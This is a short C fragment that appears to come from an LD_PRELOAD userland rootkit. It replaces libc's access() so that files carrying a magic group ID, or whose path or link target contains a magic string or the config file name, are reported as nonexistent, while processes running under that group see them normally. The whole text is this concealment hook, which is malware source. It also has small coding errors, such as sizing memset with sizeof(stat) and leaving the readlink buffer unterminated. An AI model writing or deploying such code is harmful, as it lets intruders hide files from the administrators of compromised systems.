
int access (const char *path, int amode) {
  struct stat s_fstat;
  char readlinkbuf[PATH_MAX];
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_access) old_access = dlsym(libc, "access");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_access(path,amode);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, path, &s_fstat);
  readlink(path,readlinkbuf,sizeof(readlinkbuf));
  if (s_fstat.st_gid == MAGIC_GID || (strstr (path, MAGIC_STRING))
      || (strstr (path, CONFIG_FILE)) || (strstr(readlinkbuf,CONFIG_FILE))
      || (strstr(readlinkbuf,MAGIC_STRING)) ) {
    errno = ENOENT;
    return -1;
  }
  return old_access (path, amode);
}

